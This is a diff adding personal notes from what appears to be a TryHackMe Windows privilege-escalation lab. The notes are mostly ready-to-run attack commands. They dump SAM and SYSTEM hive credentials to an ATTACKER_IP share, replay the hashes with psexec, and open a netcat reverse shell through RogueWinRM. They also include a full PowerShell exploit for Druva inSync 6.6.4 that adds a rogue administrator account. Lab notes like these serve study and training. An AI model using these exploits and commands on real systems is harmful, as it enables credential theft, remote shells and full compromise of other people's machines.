@@ -184,6 +184,61 @@ python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -pa
 -copy to share
 C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
 C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+psexec.py -hashes [hash] [user]@[MACHINE_IP]
+
+SeImporsonate / SeAssignPrimaryToken
+-FTP: user uses personal token to access FTP server and FTP server uses its own token to retrieve files
+-Local Service and network service accounts have similar privileges
+-PORT  5985 used for WinRM service - powershell console used remotely
+-start netcat listner
+nc -lvp 4442
+-victim machine 
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+
+---------------------------------------------------------------------------------------------
+
+Unpatched software
+-wmic to list installed software and dump information
+wmic product get name,version,vendor
+-may not return all installed programs
+-search on exploit-db, packet storm or google to find exploits
+
+Druva inSync 6.6.4
+-vuln: runs RPC server on port 6064 with System privileges
+-run the code in powershell
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+
+-open command prompt as admin
+-use new created account
+pwnd
+SimplePass123
+
+-find flag C:\Users\Administrator\Desktop
+type flag.txt
+*THM{EZ_DLL_PROXY_4ME}
+
+
+
 
 
 
